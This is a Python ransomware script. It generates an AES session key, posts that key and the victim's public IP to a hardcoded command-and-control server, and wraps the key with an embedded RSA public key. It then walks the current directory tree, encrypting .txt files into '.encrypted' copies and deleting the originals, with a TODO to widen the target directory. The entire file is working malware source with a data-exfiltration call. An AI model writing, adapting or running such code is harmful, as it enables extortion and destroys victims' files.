# Lock (encrypt) all .txt, etc... files in the directory, store encrypted key in registry

"""
1. Generate AES session key.
2. Send key to remote server
2. Encrypt AES session key with public RSA key
3. Traverse system
4. Encrypt all files ending in (.txt, ...) with AES session key (refer to example)
"""
import os
from base64 import b64encode 
from requests import post, get
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES, PKCS1_OAEP

tgt_exts = ['txt']
REMOTE_C2='http://192.168.230.128:9000'
PUBLIC_KEY='''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkhgXKdG6b2S3AjafAdmc
0g0+saoV+Vn/nh0oDceLTiX7qenMwJGAvCSaGZTDXv+nbfSIs6nLVd4jkgdpUyL2
u2gpVPRMXP/NEJSaPDUq0s1uvpBl5ujgjWCnfXOcSjzaizL/tqBqRm9jrBDdnogF
Z40xKMePxWvukP3XzREFDaoBlYlzjv7rg4jz9NzRNlCoC5GWajkp7/Q4cums82nq
zBQoT1vI6+5UlSU+GDVertMNRCTb+HabkPVLAGvG4qncBoHlnxuDQ2Grl6+3njOr
sw+uykWsefFxO1VIaVnDQIMZQ+JMCiCErdzTpzwNj6HUG7ER8bp7MCLgRoGhuooP
MQIDAQAB
-----END PUBLIC KEY-----'''

def main():
    #1. Generate AES session key
    aes = get_random_bytes(16)

    # Send data to remote server
    publicIP = get('https://api.ipify.org').text
    userInfo = '\tUser: ' + publicIP + '\n\tKey: ' + str(b64encode(aes))
    print(userInfo)
    try:
        req = post(REMOTE_C2, data=userInfo, timeout=5)
    except:
        print('--> Did not send data, unable to connect to remote server')

    public = RSA.import_key(PUBLIC_KEY.encode())

    #2. Encrypt AES key with public RSA key
    c_rsa = PKCS1_OAEP.new(public)
    enc_aes = c_rsa.encrypt(aes)
    
    #3. Traverse system, encrypt files with AES session key
    sys_files = os.walk(os.getcwd()) #TODO: Change search directory!
    for root, dir, files in sys_files:
        for file in files:
            c_aes = AES.new(aes, AES.MODE_EAX)
            if file.split('.')[1] in tgt_exts:
                print('x ' + root + '\\' + file)
                path = root + '\\' + file
                # read current file
                with open(path, 'rb') as f:
                    data = f.read()
                ciphertext, tag = c_aes.encrypt_and_digest(data)
                # write en data into new
                newf = path+'.encrypted'
                with open(newf, 'wb') as f:
                    [ f. write(x) for x in (enc_aes, c_aes.nonce, tag, ciphertext)]

                os.remove(path)
    print("Job Done")

if __name__ == '__main__':
    main()
